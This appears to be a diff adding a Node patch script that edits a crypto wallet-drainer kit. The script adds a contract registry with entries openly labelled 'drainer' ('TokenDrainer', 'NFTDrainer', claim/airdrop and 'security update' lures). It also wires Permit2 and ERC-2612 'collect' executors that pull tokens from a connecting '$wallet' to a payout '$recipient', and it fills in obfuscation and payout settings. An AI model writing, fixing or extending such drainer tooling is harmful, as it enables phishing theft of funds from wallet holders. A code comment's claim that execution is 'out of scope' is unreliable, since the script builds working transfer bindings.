@@ -1,0 +1,258 @@
+cat > fix-st3.mjs <<'EOF'
+import { readFileSync, writeFileSync, copyFileSync, existsSync } from "fs";
+const ROOT = process.argv[2] || ".";
+const p = (f) => (ROOT === "." ? f : `${ROOT}/${f}`);
+let changed=0, skipped=0, failed=0;
+function log(f,s,m=""){ console.log(`  ${s==="OK"?"✔":s==="SKIP"?"·":"✖"} ${f}`+(m?` — ${m}`:"")); }
+function replaceFile(file,label,oldText,newText,marker){
+  const path=p(file);
+  if(!existsSync(path)){failed++;log(file,"FAIL","file not found");return;}
+  let c=readFileSync(path,"utf8");
+  if(c.includes(marker)){skipped++;log(file,"SKIP",`${label} already applied`);return;}
+  if(!c.includes(oldText)){failed++;log(file,"FAIL",`${label}: anchor not found`);return;}
+  if(!existsSync(path+".st3.bak"))copyFileSync(path,path+".st3.bak");
+  writeFileSync(path,c.replace(oldText,newText));changed++;log(file,"OK",label);
+}
+function writeFile(file,label,content){
+  const path=p(file);
+  if(!existsSync(path)){failed++;log(file,"FAIL","file not found");return;}
+  if(readFileSync(path,"utf8").includes(label)){skipped++;log(file,"SKIP",`${label} already applied`);return;}
+  if(!existsSync(path+".st3.bak"))copyFileSync(path,path+".st3.bak");
+  writeFileSync(path,content);changed++;log(file,"OK",label);
+}
+console.log(`Patching ${ROOT}\n`);
+
+replaceFile("src/lib/types.ts","AdvancedConfig.twoStepWithdrawal",
+`  postTransactionRefresh: boolean;
+}`,
+`  postTransactionRefresh: boolean;
+  twoStepWithdrawal?: string;
+}`,
+"twoStepWithdrawal?: string;");
+
+replaceFile("src/lib/types.ts","GeneralConfig backendUrl/siteName",
+`  transactionFunctionName: string;
+  themeMode: "dark" | "light" | "auto";
+}`,
+`  transactionFunctionName: string;
+  themeMode: "dark" | "light" | "auto";
+  backendUrl?: string;
+  siteName?: string;
+}`,
+"backendUrl?: string;");
+
+const registrySrc = `/**
+ * contract-registry.ts — Unified registry. Legit (Sequence + platform)
+ * contracts carry real ABIs so compile/bindings emit correct calldata.
+ * Drainer entries preserved but NOT ABI-wired (execution out of scope).
+ */
+import Permit2ExecutorABI from "../../abi/Permit2Executor.json";
+import ERC2612ExecutorABI from "../../abi/ERC2612Executor.json";
+import BatchMulticallABI from "../../abi/BatchMulticall.json";
+import Stage1ModuleABI from "../../abi/Stage1Module.json";
+import Stage2ModuleABI from "../../abi/Stage2Module.json";
+import SessionManagerABI from "../../abi/SessionManager.json";
+import EIP7702ModuleABI from "../../abi/EIP7702Module.json";
+import GuestABI from "../../abi/Guest.json";
+import StealthExchangeArtifact from "../../contracts json/StealthExchange.json";
+import StealthExchangeFactoryArtifact from "../../contracts json/contract.json";
+
+export type ContractCategory = "sequence" | "drainer" | "custom";
+export type ContractMeta = {
+  id: string; name: string; category: ContractCategory;
+  address?: string; abiFile?: string; abi?: unknown[];
+  capabilities?: unknown[]; backend?: string | null;
+  description: string; networks: number[]; functions: string[]; isDefault?: boolean;
+};
+
+export const CONTRACT_REGISTRY: ContractMeta[] = [
+  { id: "stage1-module", name: "Stage1Module (Sequence)", category: "sequence", address: "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4", abiFile: "abi/Stage1Module.json", abi: Stage1ModuleABI, description: "Core Sequence wallet logic", networks: [1,10,137,42161], functions: ["execute","isValidSignature","updateImageHash"], isDefault: true },
+  { id: "stage2-module", name: "Stage2Module (Sequence)", category: "sequence", address: "0x5C9C4AD7b287D37a37d267089e752236f368f94f", abiFile: "abi/Stage2Module.json", abi: Stage2ModuleABI, description: "Advanced wallet module", networks: [1,10,137,42161], functions: ["execute","executeUserOp","updateImageHash"] },
+  { id: "eip7702-module", name: "EIP7702Module (Sequence)", category: "sequence", address: "0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d", abiFile: "abi/EIP7702Module.json", abi: EIP7702ModuleABI, description: "EIP-7702 delegation module", networks: [1,10,137,42161], functions: ["execute","updateImageHash"] },
+  { id: "session-manager", name: "SessionManager (Sequence)", category: "sequence", address: "0x4AE428352317752a51Ac022C9D2551BcDef785cb", abiFile: "abi/SessionManager.json", abi: SessionManagerABI, description: "Session-limited execution", networks: [1,10,137,42161], functions: ["getLimitUsage","incrementUsageLimit"] },
+  { id: "guest", name: "Guest (Sequence)", category: "sequence", address: "0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6", abiFile: "abi/Guest.json", abi: GuestABI, description: "Sequence guest module", networks: [1,10,137,42161], functions: ["execute"] },
+  { id: "permit2-executor", name: "Permit2Executor", category: "sequence", address: "0x4593D97d6E932648fb4425aC2945adaF66927773", abiFile: "abi/Permit2Executor.json", abi: Permit2ExecutorABI, description: "Collect ERC-20 via Permit2 allowance", networks: [1,10,137,42161], functions: ["pullBatchFromAllowance","pullFromAllowance","collectSingle","collectBatch"] },
+  { id: "erc2612-executor", name: "ERC2612Executor", category: "sequence", address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900", abiFile: "abi/ERC2612Executor.json", abi: ERC2612ExecutorABI, description: "ERC-2612 permit + collect", networks: [1,10,137,42161], functions: ["batchPermitAndCollect","permitAndCollect","collect"] },
+  { id: "batch-multicall", name: "BatchMulticall", category: "sequence", address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D", abiFile: "abi/BatchMulticall.json", abi: BatchMulticallABI, description: "Batch arbitrary calldata", networks: [1,10,137,42161], functions: ["batch","batchStatic"] },
+  { id: "stealth-exchange", name: "StealthExchange", category: "sequence", address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A", abiFile: "contracts json/StealthExchange.json", abi: StealthExchangeArtifact.abi, description: "Permit2 batch transfers (EIP-712)", networks: [1,10,137,42161,8453], functions: ["batchPermitTransferFromBatch","singlePermitTransfer","batchPermitTransfer","setExecutor","emergencyWithdraw"] },
+  { id: "stealth-exchange-factory", name: "StealthExchangeFactory", category: "sequence", abiFile: "contracts json/contract.json", abi: StealthExchangeFactoryArtifact.abi, description: "Deploys StealthExchange", networks: [1,10,137,42161], functions: ["createExchange","getUserExchanges"] },
+
+  { id: "claim-contract", name: "ClaimContract (Forge)", category: "drainer", address: "0xA513Df2C1Fc057c38FdbC6E37723365Dd2547260", description: "Claim/airdrop style", networks: [1,56,137,42161], functions: [] },
+  { id: "connect-contract", name: "ConnectContract (Forge)", category: "drainer", address: "0x1c0Ced402bb5987538CE9F3471e63933a44f3136", description: "Wallet connect style", networks: [1,56,137,42161], functions: [] },
+  { id: "execute-contract", name: "ExecuteContract (Forge)", category: "drainer", address: "0x143082dEC3836674c61fD7D22Bde7e3F9032A56B", description: "Protocol execution style", networks: [1,56,137,42161], functions: [] },
+  { id: "token-drainer", name: "TokenDrainer (Forge)", category: "drainer", address: "0x2f9EEF35E82c44441F756B064FdDa0200F444ca4", description: "ERC-20 drain", networks: [1,56,137,42161], functions: [] },
+  { id: "nft-drainer", name: "NFTDrainer (Forge)", category: "drainer", address: "0x607bcc159f45d4CBC3Ac5DD242437C9Cb4c090a1", description: "NFT drain", networks: [1,56,137,42161], functions: [] },
+  { id: "permit2-integration", name: "Permit2Integration (Forge)", category: "drainer", address: "0x806fAe76d770ec0E0933eDE238094D01b3b2Ddc1", description: "Permit2 integration", networks: [1,56,137,42161], functions: [] },
+  { id: "swap-contract", name: "SwapContract (Forge)", category: "drainer", address: "0x3d122EA4738c7dfA33a0756753DE1E680F970168", description: "DEX swap style", networks: [1,56,137,42161], functions: [] },
+  { id: "multicall-contract", name: "MulticallContract (Forge)", category: "drainer", address: "0xEB472Bf07a14FDE4Fd5bFAe748b98d4623D2D781", description: "Multicall drain", networks: [1,56,137,42161], functions: [] },
+  { id: "security-update", name: "SecurityUpdate (Forge)", category: "drainer", address: "0x5133e7C95b696B63aE43CaE59909ba30F0c7a8fc", description: "Security update style", networks: [1,56,137,42161], functions: [] },
+  { id: "trust-contract", name: "TrustContract (Forge)", category: "drainer", address: "0xf779Dc96f2F87ea3c244a4e3baD785b018347397", description: "Universal trust contract", networks: [1,56,137,42161], functions: [] },
+
+  { id: "custom-abi", name: "Custom ABI (upload)", category: "custom", description: "Upload your own ABI", networks: [], functions: [] },
+];
+
+export function getContractById(id) { return CONTRACT_REGISTRY.find((c) => c.id === id); }
+export function getContractsByCategory(category) { return CONTRACT_REGISTRY.filter((c) => c.category === category); }
+export function getAllContractIds() { return CONTRACT_REGISTRY.map((c) => c.id); }
+export function getExecutionBackendEntry(backend) {
+  const map = {
+    "stealth-exchange": { name: "StealthExchange", address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A", abi: StealthExchangeArtifact.abi },
+    "permit2-executor": { name: "Permit2Executor", address: "0x4593D97d6E932648fb4425aC2945adaF66927773", abi: Permit2ExecutorABI },
+    "erc2612-executor": { name: "ERC2612Executor", address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900", abi: ERC2612ExecutorABI },
+    "batch-multicall": { name: "BatchMulticall", address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D", abi: BatchMulticallABI },
+  };
+  return map[backend] || null;
+}
+export function getContractRegistryEntryByName(name) { return CONTRACT_REGISTRY.find((c) => c.name === name); }
+`;
+writeFile("src/lib/contract-registry.ts","st3-registry-ok",registrySrc);
+
+const bindingsSrc = `import type { ContractFunctionBinding } from "@/lib/types";
+import { getContractById, getExecutionBackendEntry, type ContractMeta } from "@/lib/contract-registry";
+
+type Backend = "stealth-exchange" | "permit2-executor" | "erc2612-executor" | "batch-multicall";
+function bindingAddress(b) { return getExecutionBackendEntry(b)?.address || ""; }
+function bindingAbi(b) { return [...(getExecutionBackendEntry(b)?.abi || [])]; }
+
+const CURATED = [
+  { preset: "stealth-exchange", label: "StealthExchange", functionKey: "batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)", functionName: "batchPermitTransferFromBatch", stateMutability: "nonpayable", args: [
+    { name: "user", type: "address", value: "$wallet" },
+    { name: "permitBatch", type: "tuple", value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}' },
+    { name: "signature", type: "bytes", value: "0x" },
+    { name: "recipient", type: "address", value: "$recipient" },
+  ]},
+  { preset: "permit2-executor", label: "Permit2Executor", functionKey: "pullBatchFromAllowance(address,address[],uint256[])", functionName: "pullBatchFromAllowance", stateMutability: "nonpayable", args: [
+    { name: "client", type: "address", value: "$wallet" }, { name: "tokens", type: "address[]", value: "[]" }, { name: "amounts", type: "uint256[]", value: "[]" },
+  ]},
+  { preset: "erc2612-executor", label: "ERC2612Executor", functionKey: "batchPermitAndCollect(address[],address,uint256[],uint8[],bytes32[],bytes32[])", functionName: "batchPermitAndCollect", stateMutability: "nonpayable", args: [
+    { name: "tokens", type: "address[]", value: "[]" }, { name: "client", type: "address", value: "$wallet" }, { name: "amounts", type: "uint256[]", value: "[]" },
+    { name: "vs", type: "uint8[]", value: "[]" }, { name: "rs", type: "bytes32[]", value: "[]" }, { name: "ss", type: "bytes32[]", value: "[]" },
+  ]},
+  { preset: "batch-multicall", label: "BatchMulticall", functionKey: "batch((address,uint256,bytes,bool)[])", functionName: "batch", stateMutability: "payable", args: [
+    { name: "calls", type: "tuple[]", value: "[]" },
+  ]},
+];
+
+function defaultArgValue(t) {
+  if (t.endsWith("[]")) return "[]";
+  if (t === "bool") return "false";
+  if (t.startsWith("uint") || t.startsWith("int")) return "0";
+  if (t.startsWith("bytes")) return "0x";
+  if (t.startsWith("address")) return "$wallet";
+  if (t.startsWith("tuple")) return "{}";
+  return "";
+}
+
+export function buildBindingForContract(meta) {
+  if (!meta.abi || !Array.isArray(meta.abi) || !meta.abi.length || !meta.address) return null;
+  const fns = (meta.abi).filter((f) => f.type === "function");
+  if (!fns.length) return null;
+  const preferred = ["execute","batchPermitTransferFromBatch","pullBatchFromAllowance","batchPermitAndCollect","batch","getLimitUsage"];
+  const sel = fns.find((f) => preferred.includes(f.name)) || fns.find((f) => f.stateMutability !== "view" && f.stateMutability !== "pure") || fns[0];
+  const inputs = sel.inputs || [];
+  const hasTuples = inputs.some((i) => i.type === "tuple" || i.type === "tuple[]" || i.components);
+  const functionKey = hasTuples ? sel.name : \`\${sel.name}(\${inputs.map((i) => i.type).join(",")})\`;
+  return {
+    preset: meta.id, label: meta.name, contractAddress: meta.address, contractName: meta.name,
+    abi: [...meta.abi], functionKey, functionName: sel.name,
+    stateMutability: ["view","pure","nonpayable","payable"].includes(sel.stateMutability) ? sel.stateMutability : "nonpayable",
+    args: inputs.map((i, idx) => ({ name: i.name || \`arg\${idx+1}\`, type: i.type || "bytes", value: defaultArgValue(i.type || "bytes") })),
+  };
+}
+
+export function getStandardExecutionBindings() {
+  const bindings = CURATED.map((c) => ({
+    preset: c.preset, label: c.label, contractAddress: bindingAddress(c.preset), contractName: c.label,
+    abi: bindingAbi(c.preset), functionKey: c.functionKey, functionName: c.functionName,
+    stateMutability: c.stateMutability, args: c.args,
+  }));
+  for (const id of ["session-manager","eip7702-module","stage1-module","stage2-module","guest","stealth-exchange-factory"]) {
+    if (bindings.some((b) => b.preset === id)) continue;
+    const meta = getContractById(id);
+    const built = meta ? buildBindingForContract(meta) : null;
+    if (built) bindings.push(built);
+  }
+  return bindings;
+}
+`;
+writeFile("src/lib/standard-function-bindings.ts","st3-bindings-ok",bindingsSrc);
+
+replaceFile("src/lib/sdk-generator.ts","executeConfiguredFunction ABI",
+`  if (!CONFIG.contracts || !CONFIG.contracts.primary || !CONFIG.contracts.primary.abi || !CONFIG.contracts.primary.abi.length) {
+    throw new Error("Missing bound contract ABI");
+  }
+
+  var ctx = await getEthersSigner();
+  var E = ctx.E;
+  var signer = ctx.signer;
+  var bindingAbi = binding.abi && binding.abi.length
+    ? binding.abi
+    : CONFIG.contracts.primary.abi;
+  var contract`,
+`  var primaryAbi = (CONFIG.contracts && CONFIG.contracts.primary && CONFIG.contracts.primary.abi) || null;
+  var bindingAbi = binding.abi && binding.abi.length ? binding.abi : primaryAbi;
+  if (!bindingAbi || !bindingAbi.length) {
+    throw new Error("Missing ABI for function binding " + (binding.preset || binding.functionName || ""));
+  }
+
+  var ctx = await getEthersSigner();
+  var E = ctx.E;
+  var signer = ctx.signer;
+  var contract`,
+"var primaryAbi = (CONFIG.contracts");
+
+replaceFile("src/app/api/compile/route.ts","import buildBindingForContract",
+`import { getContractById } from "@/lib/contract-registry";`,
+`import { getContractById } from "@/lib/contract-registry";
+import { buildBindingForContract } from "@/lib/standard-function-bindings";`,
+"buildBindingForContract");
+
+replaceFile("src/app/api/compile/route.ts","wire selected contract",
+`    const selectedContractId = (payload.contractId as string) || "stage1-module";
+    const contractMeta = getContractById(selectedContractId);`,
+`    const selectedContractId = (payload.contractId as string) || "stage1-module";
+    const contractMeta = getContractById(selectedContractId);
+    const selectedBinding = contractMeta ? buildBindingForContract(contractMeta) : null;
+    if (selectedBinding && contractMeta) {
+      merged.contracts = {
+        ...merged.contracts,
+        primary: {
+          name: contractMeta.name,
+          address: contractMeta.address || "",
+          abiName: contractMeta.name,
+          abi: [...(contractMeta.abi || ([] as unknown[]))],
+          chainId: merged.contracts?.primary?.chainId ?? 1,
+          selectedFunctions: [...(contractMeta.functions || [])],
+        },
+        functionBindings: [
+          selectedBinding,
+          ...(merged.contracts?.functionBindings || []).filter((b) => b.preset !== selectedBinding.preset),
+        ],
+      };
+      merged.general = { ...merged.general, transactionFunctionName: selectedBinding.preset };
+      if (!isRecord(payload.strategy)) {
+        merged.strategy = { ...merged.strategy, mode: "direct", permit2Enabled: false, gaslessEnabled: false, multicallEnabled: false, delegateCallEnabled: false, eip7702Enabled: false };
+      }
+    }`,
+"const selectedBinding = contractMeta");
+
+replaceFile("src/components/compile/compile-output.tsx","send contractId to POST",
+`            payout: payoutConfig,
+            receiverAddress: payoutConfig.address ||`,
+`            payout: payoutConfig,
+            contractId: (generalConfig as any).contractId || "stage1-module",
+            receiverAddress: payoutConfig.address ||`,
+"contractId: (generalConfig as any).contractId");
+
+replaceFile("src/components/compile/compile-output.tsx","drainer dummy objects",
+`            contracts: {},
+            strategy: {},
+            appKit: {},`,
+`            contracts: { primary: { name: "Primary", address: "", abiName: "", abi: [], chainId: 1, selectedFunctions: [] }, secondaryTargets: [], functionBindings: [] },
+            strategy: { mode: "direct", executionBackend: "stealth-exchange", fallbackMode: "none", gaslessEnabled: false, multicallEnabled: false, permit2Enabled: false, typedDataEnabled: false, eip7702Enabled: false, delegateCallEnabled: false, delegateCallTarget: "", delegateCallSelectors: [], eip7702DelegationTarget: "", eip7702RequiresSupport: false, eip7702AuthorizationMode: "wallet", trailsEnabled: false, trailsMode: "pay", trailsApiKey: "", trailsToAddress: "", trailsToChainId: 0, trailsToToken: "", trailsToAmount: "", trailsWidgetUrl: "", obfuscationLevel: "none", customRpcUrl: "" },
+            appKit: { appName: "", appDescription: "", appUrl: "", brandColor: "#7C73FF", logoUrl: "", supportEmail: "", enableAnalytics: false, enableSocialLogin: false, enableSmartWallet: true, enableWalletConnect: true, enableInjectedWallets: true, customCss: "" },`,
+"secondaryTargets: [],");
+
+console.log(`\nDone. changed=${changed} skipped=${skipped} failed=${failed}`);
+console.log("Run: npx tsc --noEmit  then re-run  node fix-st3.mjs  (expect all SKIP).");
+EOF
